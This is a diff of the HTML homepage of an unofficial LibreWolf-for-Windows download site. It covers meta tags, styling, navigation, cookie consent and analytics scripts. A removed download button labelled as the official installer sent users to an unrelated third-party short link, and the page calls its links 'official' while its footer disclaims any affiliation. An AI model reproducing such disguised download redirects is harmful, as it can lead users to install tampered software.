@@ -4,15 +4,17 @@
   <meta charset="utf-8">
   <meta name="viewport" content="width=device-width,initial-scale=1">
   <title>LibreWolf for Windows — Private, Telemetry‑Free Browser</title>
-  <meta name="description" content="Download LibreWolf for Windows — a privacy-focused, telemetry-free Firefox fork. Easy install, portable options, and best privacy practices.">
+  <meta name="description" content="Download LibreWolf for Windows — a privacy-focused, telemetry-free Firefox fork. Official installer, portable options, checksums, and install guides. Prioritizes Windows 10 & 11 users.">
   <link rel="canonical" href="https://librewolf-windows.github.io/">
   <meta name="robots" content="index, follow">
+  <meta name="build-date" content="[BUILD_DATE]">
 
   <!-- Open Graph / Social -->
+  <meta property="og:site_name" content="LibreWolf for Windows">
   <meta property="og:title" content="LibreWolf for Windows — Private, Telemetry‑Free Browser">
-  <meta property="og:description" content="Download LibreWolf for Windows — privacy-first browser without telemetry. Official installer & guides.">
+  <meta property="og:description" content="Download LibreWolf for Windows — privacy-first browser without telemetry. Official installer, portable builds and guides for Windows users.">
   <meta property="og:url" content="https://librewolf-windows.github.io/">
-  <meta property="og:image" content="/og-librewolf-windows.png">
+  <meta property="og:image" content="https://librewolf-windows.github.io/og-librewolf-windows.png">
   <meta property="og:type" content="website">
   <meta name="twitter:card" content="summary_large_image">
 
@@ -28,25 +30,16 @@
     gtag('js', new Date());
     // default deny analytics until user accepts
     gtag('consent', 'default', { 'analytics_storage': 'denied' });
-    // we will call gtag('config', 'G-PENKWJKN66') after consent is given
+    // we will call gtag('config','G-PENKWJKN66') after consent is given
   </script>
 
-  <!-- Single embedded style (no frameworks). High contrast palette, accessible focus styles. -->
   <style>
-    :root{
-      --bg:#0F172A; --surface:#111827; --muted:#94A3B8; --text:#E5E7EB;
-      --accent:#22D3EE; --accent-2:#14B8A6; --interactive:#4F46E5; --border:#1F2937;
-      --radius:10px; --max-width:1100px; --container-pad:18px;
-      --focus: 3px solid rgba(34,211,238,0.18);
-      --shadow: 0 6px 18px rgba(2,6,23,0.6);
-      --font-sans: system-ui, -apple-system, 'Segoe UI', Roboto, 'Helvetica Neue', Arial;
-    }
+    :root{ --bg:#0F172A; --surface:#111827; --muted:#94A3B8; --text:#E5E7EB; --accent:#22D3EE; --accent-2:#14B8A6; --border:#1F2937; --radius:10px; --max-width:1100px; --container-pad:18px; --focus:3px solid rgba(34,211,238,0.18); --shadow:0 6px 18px rgba(2,6,23,0.6); --font-sans: system-ui, -apple-system, 'Segoe UI', Roboto, 'Helvetica Neue', Arial; }
     *{box-sizing:border-box}
     html,body{height:100%}
     body{margin:0;background:linear-gradient(180deg,var(--bg),#071121);color:var(--text);font-family:var(--font-sans);-webkit-font-smoothing:antialiased;line-height:1.45}
     a{color:var(--accent);text-decoration:none}
     a:focus{outline:none;box-shadow:var(--focus)}
-
     .wrap{max-width:var(--max-width);margin:28px auto;padding:var(--container-pad)}
     header{display:flex;align-items:center;justify-content:space-between;gap:12px}
     .brand{display:flex;align-items:center;gap:12px}
@@ -55,53 +48,39 @@
     nav{display:flex;gap:10px;flex-wrap:wrap}
     nav a{padding:8px 12px;border-radius:8px;color:var(--muted);font-size:0.95rem}
     nav a:hover, nav a:focus{background:rgba(255,255,255,0.02);color:var(--text);box-shadow:none}
-
-    .hero{display:grid;grid-template-columns:1fr 360px;gap:28px;align-items:center;margin-top:22px}
+    .hero{display:grid;grid-template-columns:1fr 360px;gap:28px;align-items:start;margin-top:22px}
     .card{background:linear-gradient(180deg,rgba(255,255,255,0.02),transparent);border:1px solid var(--border);padding:20px;border-radius:var(--radius);box-shadow:var(--shadow)}
     .h1{font-size:1.9rem;margin:0 0 10px}
     .lead{color:var(--muted);margin-bottom:16px}
-
-    .cta{display:flex;flex-direction:column;gap:12px}
     .btn{display:inline-flex;align-items:center;gap:10px;padding:12px 16px;border-radius:10px;border:0;cursor:pointer;font-weight:600}
     .btn-primary{background:linear-gradient(90deg,var(--accent),var(--accent-2));color:#042024}
     .btn-ghost{background:transparent;border:1px solid var(--border);color:var(--text)}
-    .btn:focus{outline:none;box-shadow:var(--focus)}
-
     .meta-list{display:flex;flex-wrap:wrap;gap:10px;color:var(--muted);font-size:0.95rem}
     .features{display:grid;grid-template-columns:repeat(2,1fr);gap:12px;margin-top:14px}
     .feature{background:transparent;padding:10px;border-radius:8px;border:1px dashed rgba(255,255,255,0.02)}
-
     footer{margin-top:28px;padding:18px;border-top:1px solid var(--border);color:var(--muted);display:flex;justify-content:space-between;align-items:center;gap:12px}
-
-    /* Cookie banner */
+    .content-section{margin-top:18px;color:var(--muted)}
+    .content-section h2{color:var(--text);margin:12px 0}
+    .content-section p{margin:8px 0}
     .cookie-banner{position:fixed;left:12px;right:12px;bottom:12px;background:var(--surface);padding:14px;border-radius:12px;border:1px solid var(--border);display:flex;align-items:center;gap:14px;box-shadow:0 10px 30px rgba(2,6,23,0.7);z-index:9999}
     .cookie-text{flex:1;color:var(--muted)}
     .cookie-actions{display:flex;gap:10px}
     .cookie-actions .btn{padding:8px 12px;font-size:0.95rem}
-
-    /* responsive */
-    @media (max-width:900px){
-      .hero{grid-template-columns:1fr;}
-      .card{padding:16px}
-    }
-
+    @media (max-width:900px){ .hero{grid-template-columns:1fr;} .card{padding:16px} }
     @media (prefers-reduced-motion:reduce){*{transition:none!important}}
-
   </style>
 </head>
 <body>
-  <!-- SVG sprite -->
   <svg style="display:none" aria-hidden="true">
     <symbol id="icon-download" viewBox="0 0 24 24"><path fill="currentColor" d="M12 3v10m0 0 4-4m-4 4-4-4M5 21h14v-2H5v2z"/></symbol>
     <symbol id="icon-windows" viewBox="0 0 24 24"><path fill="currentColor" d="M3 3.5l8.5-1.5V11H3V3.5zm9.5-1.5L21 3v8.5H12.5V2zM3 12.5l8.5-1.5V22H3v-9.5zm9.5-1.5L21 11v9l-8.5 1.5V11z"/></symbol>
     <symbol id="icon-shield" viewBox="0 0 24 24"><path fill="currentColor" d="M12 2 4 5v6c0 5 3.8 9.7 8 11 4.2-1.3 8-6 8-11V5l-8-3z"/></symbol>
-    <symbol id="icon-menu" viewBox="0 0 24 24"><path fill="currentColor" d="M3 6h18v2H3V6zm0 5h18v2H3v-2zm0 5h18v2H3v-2z"/></symbol>
   </svg>
 
   <div class="wrap">
     <header>
       <div class="brand">
-        <div class="logo card" aria-hidden="true" style="display:flex;align-items:center;justify-content:center;border-radius:12px;padding:6px;"> 
+        <div class="logo card" aria-hidden="true" style="display:flex;align-items:center;justify-content:center;border-radius:12px;padding:6px;">
           <svg width="36" height="36" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg"><circle cx="12" cy="12" r="10" fill="#0B1220"/><path d="M6 15c2-4 6-6 9-7" stroke="#22D3EE" stroke-width="1.6" stroke-linecap="round" stroke-linejoin="round"/></svg>
         </div>
         <div>
@@ -111,21 +90,20 @@
       </div>
 
       <nav aria-label="Main navigation">
-        <a href="/">Home</a>
-        <a href="/install-windows.html">Install</a>
-        <a href="/update-windows.html">Update</a>
-        <a href="/portable-windows.html">Portable</a>
+        <a href="/index.html">Home</a>
+        <a href="/download.html">Download</a>
+        <a href="/install.html">Install</a>
+        <a href="/portable.html">Portable</a>
         <a href="/drm-widevine.html">DRM & Streaming</a>
-        <a href="/best-extensions.html">Best Extensions</a>
-        <a href="/compare-browsers.html">Compare</a>
-        <a href="/troubleshoot.html">Troubleshoot</a>
+        <a href="/faq.html">FAQ</a>
+        <a href="/privacy-telemetry.html">Privacy</a>
       </nav>
     </header>
 
     <main class="hero" role="main">
       <section class="card">
         <h1 class="h1">LibreWolf for Windows</h1>
-        <p class="lead">A privacy-focused fork of Firefox, tuned to block telemetry and minimize fingerprinting. Easy to install on Windows 10 & 11 with the official installer.</p>
+        <p class="lead">Quick answer: Download the official LibreWolf installer for Windows or choose the portable build. Privacy-first defaults, telemetry disabled, and recommended verification steps available on the Download page.</p>
 
         <div class="meta-list">
           <div>Version: <strong>150.0.1-1</strong></div>
@@ -134,39 +112,63 @@
         </div>
 
         <div class="features" aria-hidden="false">
-          <div class="feature"><svg width="18" height="18" style="vertical-align:middle;margin-right:8px"><use href="#icon-shield"/></svg><strong>Privacy by default</strong><div style="color:var(--muted);font-size:0.92rem">Telemetry disabled, hardened prefs</div></div>
-          <div class="feature"><svg width="18" height="18" style="vertical-align:middle;margin-right:8px"><use href="#icon-windows"/></svg><strong>Windows friendly</strong><div style="color:var(--muted);font-size:0.92rem">Installer and portable builds supported</div></div>
-          <div class="feature"><svg width="18" height="18" style="vertical-align:middle;margin-right:8px"><use href="#icon-download"/></svg><strong>Official release</strong><div style="color:var(--muted);font-size:0.92rem">Direct download link to the official binary</div></div>
-          <div class="feature"><svg width="18" height="18" style="vertical-align:middle;margin-right:8px"><use href="#icon-shield"/></svg><strong>Open source</strong><div style="color:var(--muted);font-size:0.92rem">Community-driven and auditable</div></div>
+          <div class="feature"><svg width="18" height="18" style="vertical-align:middle;margin-right:8px"><use href="#icon-shield"/></svg><strong>Privacy by default</strong><div style="color:var(--muted);font-size:0.92rem">Telemetry disabled, hardened prefs and additional privacy tweaks.</div></div>
+          <div class="feature"><svg width="18" height="18" style="vertical-align:middle;margin-right:8px"><use href="#icon-windows"/></svg><strong>Windows friendly</strong><div style="color:var(--muted);font-size:0.92rem">Installer, portable builds and instructions for Windows 10 & 11.</div></div>
+          <div class="feature"><svg width="18" height="18" style="vertical-align:middle;margin-right:8px"><use href="#icon-download"/></svg><strong>Official release</strong><div style="color:var(--muted);font-size:0.92rem">Direct links, mirrors and checksum verification to ensure integrity.</div></div>
+          <div class="feature"><svg width="18" height="18" style="vertical-align:middle;margin-right:8px"><use href="#icon-shield"/></svg><strong>Open source</strong><div style="color:var(--muted);font-size:0.92rem">Community-driven, auditable code and documented releases.</div></div>
         </div>
 
         <div style="margin-top:16px;color:var(--muted);font-size:0.95rem">Quick actions</div>
         <div style="display:flex;gap:10px;margin-top:10px;flex-wrap:wrap">
-          <button class="btn btn-primary" id="download-btn" aria-label="Download LibreWolf for Windows" onclick="handleDownload('librewolf-150.0.1-1-windows-x86_64-setup.exe','https://www2.softwareportal.store/mbzCcrFL')">
+          <a class="btn btn-primary" href="/download.html" aria-label="Go to download page for LibreWolf for Windows">
             <svg width="18" height="18" style="vertical-align:middle"><use href="#icon-download"/></svg>
             Get LibreWolf for Windows
-          </button>
-          <a class="btn btn-ghost" href="/install-windows.html">Install Guide</a>
+          </a>
+          <a class="btn btn-ghost" href="/install.html">Install Guide</a>
+        </div>
+
+        <div class="content-section">
+          <h2>Why choose LibreWolf on Windows?</h2>
+          <p>LibreWolf is a community-maintained fork of Firefox with a strong focus on privacy and reduced telemetry. The Windows builds here include an installer for easy setup and a portable option for users who prefer no-install, no-admin workflows. If you want a browser tuned to reduce tracking surface while keeping compatibility with modern web features, LibreWolf is a solid choice.</p>
+
+          <h2>Which build should I pick?</h2>
+          <p>We provide two main distributions for Windows: the installer (recommended for everyday users) and a portable build (for USB / temporary use). For package-manager fans, see the <a href="/install.html">Install</a> instructions and the <a href="/install-winget.html">winget</a> guide. Detailed comparisons between portable and installed versions are available on the <a href="/portable-vs-install.html">Portable vs Install</a> page.</p>
+
+          <h2>Security & verification</h2>
+          <p>Always verify the SHA256 checksum before running an installer. Checksums and verification commands (PowerShell / certutil) are shown on the <a href="/download.html">Download</a> page. We link to official mirrors and signature files when available.</p>
+
+          <h2>Streaming and DRM</h2>
+          <p>LibreWolf disables some DRM modules by default for privacy. If you need Widevine to watch Netflix or other services, follow the steps on <a href="/drm-widevine.html">DRM & Streaming</a> to enable support and troubleshoot playback issues.</p>
+
+          <h2>Privacy & telemetry</h2>
+          <p>We document exactly what is and isn't collected on the <a href="/privacy-telemetry.html">Telemetry</a> page. You can also configure privacy-related settings in the <a href="/privacy-settings.html">Privacy Settings</a> guide.</p>
+
+          <h2>Need help?</h2>
+          <p>Common questions and troubleshooting tips are available in the <a href="/faq.html">FAQ</a> and <a href="/support-troubleshooting.html">Troubleshooting</a> pages. If you want to contribute or view sources, visit the <a href="/about-github.html">GitHub</a> section.</p>
         </div>
 
       </section>
 
       <aside class="card" aria-labelledby="sidebar-title">
         <h2 id="sidebar-title" style="margin-top:0">Installer</h2>
-        <p style="color:var(--muted);margin-top:0">Direct official installer (x86_64). File size: ~70MB.</p>
+        <p style="color:var(--muted);margin-top:0">Official installer (x86_64). File size: ~70MB.</p>
         <div style="margin-top:10px">
           <div style="font-size:0.95rem;color:var(--muted)">SHA256 (recommended verify):</div>
-          <code style="display:block;background:transparent;padding:8px;margin-top:8px;border-radius:8px;border:1px solid var(--border);font-size:0.82rem;overflow:auto;color:var(--muted)">[sha256-hash-will-be-added]</code>
+          <code id="sha256" style="display:block;background:transparent;padding:8px;margin-top:8px;border-radius:8px;border:1px solid var(--border);font-size:0.82rem;overflow:auto;color:var(--muted)">[INSERT_SHA256_HERE]</code>
         </div>
 
         <hr style="border:none;border-top:1px solid var(--border);margin:12px 0">
 
         <div style="font-size:0.95rem;color:var(--muted)">Quick links</div>
         <ul style="padding-left:18px;margin:8px 0;color:var(--muted)">
-          <li><a href="/update-windows.html">Update methods (winget / scoop)</a></li>
+          <li><a href="/update.html">Update methods (winget)</a></li>
           <li><a href="/drm-widevine.html">Streaming & DRM fixes</a></li>
-          <li><a href="/portable-windows.html">Portable builds</a></li>
+          <li><a href="/portable.html">Portable builds</a></li>
+          <li><a href="/install-winget.html">winget package</a></li>
         </ul>
+
+        <div style="margin-top:12px;color:var(--muted);font-size:0.9rem">Direct mirror (opens in new tab):</div>
+        <div style="margin-top:6px"><a href="https://dl.librewolf.net/librewolf/150.0.1-1/librewolf-150.0.1-1-windows-x86_64-setup.exe" target="_blank" rel="noopener noreferrer" style="color:var(--muted);font-size:0.92rem">Official download mirror (dl.librewolf.net)</a></div>
 
         <div style="margin-top:12px;color:var(--muted);font-size:0.9rem">Last updated:</div>
         <div id="last-modified" style="font-weight:600;margin-top:6px">—</div>
@@ -176,127 +178,69 @@
     <footer>
       <div>Unofficial page • Not affiliated with the LibreWolf project. Uses official release assets.</div>
       <div style="display:flex;gap:12px;align-items:center">
-        <a href="/privacy-cookies.html" style="color:var(--muted)">Privacy & Cookies</a>
+        <a href="/privacy-telemetry.html" style="color:var(--muted)">Privacy & Telemetry</a>
+        <a href="/sitemap.xml" style="color:var(--muted)">Sitemap</a>
         <div style="color:var(--muted);font-size:0.92rem">© LibreWolf builds mirror</div>
       </div>
     </footer>
   </div>
 
-  <!-- Cookie banner -->
-  <div id="cookie-banner" class="cookie-banner" role="dialog" aria-live="polite" style="display:none">
+  <div id="cookie-banner" class="cookie-banner" role="dialog" aria-live="polite" aria-label="Cookie preferences" style="display:none">
     <div style="display:flex;align-items:center;gap:12px">
       <svg width="28" height="28"><use href="#icon-shield"/></svg>
     </div>
     <div class="cookie-text">
       We use a minimal set of cookies to provide analytics and improve this site. Analytics are disabled until you Accept. No tracking cookies are set if you Decline.
-      <div style="margin-top:8px;font-size:0.92rem"><a href="/privacy-cookies.html">Privacy & Cookies</a></div>
+      <div style="margin-top:8px;font-size:0.92rem"><a href="/privacy-telemetry.html">Privacy & Telemetry</a></div>
     </div>
     <div class="cookie-actions">
       <button class="btn btn-primary" id="cookie-accept">Accept</button>
       <button class="btn btn-ghost" id="cookie-decline">Decline</button>
-      <button class="btn" id="cookie-close" aria-label="Close cookie dialog">Close</button>
+      <button class="btn" id="cookie-manage" aria-label="Manage cookie preferences">Manage</button>
     </div>
   </div>
 
-  <!-- Minimal JS: consent management, download events, JSON-LD injection, last-modified -->
   <script>
     (function(){
-      const DOWNLOAD_FILE = 'librewolf-150.0.1-1-windows-x86_64-setup.exe';
-      const DOWNLOAD_URL = 'https://dl.librewolf.net/librewolf/150.0.1-1/librewolf-150.0.1-1-windows-x86_64-setup.exe';
+      const MIRROR_URL = 'https://dl.librewolf.net/librewolf/150.0.1-1/librewolf-150.0.1-1-windows-x86_64-setup.exe';
 
-      // Cookie consent handling
+      // Consent handling
       const banner = document.getElementById('cookie-banner');
       const acceptBtn = document.getElementById('cookie-accept');
       const declineBtn = document.getElementById('cookie-decline');
-      const closeBtn = document.getElementById('cookie-close');
+      const manageBtn = document.getElementById('cookie-manage');
 
       function setConsent(state){
-        localStorage.setItem('site_cookie_consent', state); // 'granted' or 'denied' or 'dismissed'
+        localStorage.setItem('site_cookie_consent', state);
         if(state === 'granted'){
-          // update gtag consent and configure
           try{ gtag('consent','update',{ 'analytics_storage':'granted' }); }catch(e){}
           try{ gtag('config','G-PENKWJKN66'); }catch(e){}
         } else {
           try{ gtag('consent','update',{ 'analytics_storage':'denied' }); }catch(e){}
         }
-        hideBanner();
+        banner.style.display = 'none';
       }
-      function hideBanner(){ banner.style.display = 'none'; }
 
       const stored = localStorage.getItem('site_cookie_consent');
       if(!stored){ banner.style.display = 'flex'; }
+      else if(stored === 'granted'){ try{ gtag('config','G-PENKWJKN66'); }catch(e){} }
 
       acceptBtn.addEventListener('click',function(){ setConsent('granted'); });
       declineBtn.addEventListener('click',function(){ setConsent('denied'); });
-      closeBtn.addEventListener('click',function(){ setConsent('dismissed'); });
+      manageBtn.addEventListener('click',function(){ window.location.href = '/privacy-telemetry.html'; });
 
-      // Download handler — fires gtag event only if consent granted
-      window.handleDownload = function(filename, url){
-        const consent = localStorage.getItem('site_cookie_consent');
-        if(consent === 'granted'){
-          try{ gtag('event','file_download', { event_category:'downloads', event_label: filename, file_url: url }); }catch(e){console.warn('gtag not ready',e)}
-        }
-        // start download
-        window.location.href = url;
-      };
-
-      // Last modified display
+      // Last modified
       const lm = document.getElementById('last-modified');
       try{
-        const dm = document.lastModified ? new Date(document.lastModified) : new Date();
+        const build = document.querySelector('meta[name="build-date"]');
+        const dateStr = build && build.content && build.content !== '[BUILD_DATE]' ? build.content : document.lastModified;
+        const dm = dateStr ? new Date(dateStr) : new Date();
         lm.textContent = dm.toLocaleString('en-US', { year:'numeric', month:'short', day:'numeric' });
       }catch(e){ lm.textContent = 'Unknown'; }
 
-      // Inject JSON-LD for schema.org (SoftwareApplication + FAQ + Breadcrumb + WebSite)
-      function injectJsonLd(){
-        const ld = {
-          "@context": "https://schema.org",
-          "@graph": [
-            {
-              "@type":"WebSite",
-              "@id":"https://librewolf-windows.github.io/#site",
-              "url":"https://librewolf-windows.github.io/",
-              "name":"LibreWolf for Windows",
-              "publisher":{"@type":"Organization","name":"LibreWolf builds mirror"},
-              "potentialAction":{
-                "@type":"SearchAction",
-                "target":"https://librewolf-windows.github.io/?q={search_term_string}",
-                "query-input":"required name=search_term_string"
-              }
-            },
-            {
-              "@type":"SoftwareApplication",
-              "@id":"https://librewolf-windows.github.io/#software",
-              "name":"LibreWolf",
-              "description":"LibreWolf - privacy focused fork of Firefox. Installer for Windows x86_64.",
-              "applicationCategory":"Browser",
-              "operatingSystem":"Windows 11; Windows 10",
-              "softwareVersion":"150.0.1-1",
-              "downloadUrl":"https://dl.librewolf.net/librewolf/150.0.1-1/librewolf-150.0.1-1-windows-x86_64-setup.exe",
-              "offers":{ "@type":"Offer","price":"0","priceCurrency":"USD","availability":"https://schema.org/InStock" },
-              "publisher":{"@type":"Organization","name":"LibreWolf builds mirror"},
-              "dateModified":(new Date(document.lastModified || Date.now())).toISOString()
-            },
-            {
-              "@type":"BreadcrumbList",
-              "itemListElement":[
-                {"@type":"ListItem","position":1,"name":"Home","item":"https://librewolf-windows.github.io/"}
-              ]
-            },
-            {
-              "@type":"FAQPage",
-              "mainEntity":[
-                {"@type":"Question","name":"How do I install LibreWolf on Windows?","acceptedAnswer":{"@type":"Answer","text":"Download the official installer and run it. See the Install guide for step‑by‑step instructions."}},
-                {"@type":"Question","name":"Is LibreWolf safe for streaming services?","acceptedAnswer":{"@type":"Answer","text":"By default some DRM modules are disabled. Check the DRM & Streaming guide to enable Widevine if needed."}},
-                {"@type":"Question","name":"How can I update LibreWolf?","acceptedAnswer":{"@type":"Answer","text":"Manual updates are supported; you can also use package managers like winget or scoop. See the Update guide."}}
-              ]
-            }
-          ]
-        };
-        const s = document.createElement('script'); s.type='application/ld+json'; s.text = JSON.stringify(ld);
-        document.head.appendChild(s);
-      }
-      injectJsonLd();
+      // Insert mirror URL to clickable elements if needed
+      const shaBox = document.getElementById('sha256');
+      // placeholder: replace [INSERT_SHA256_HERE] at build-time or manually with the official SHA256 checksum.
 
     })();
   </script>
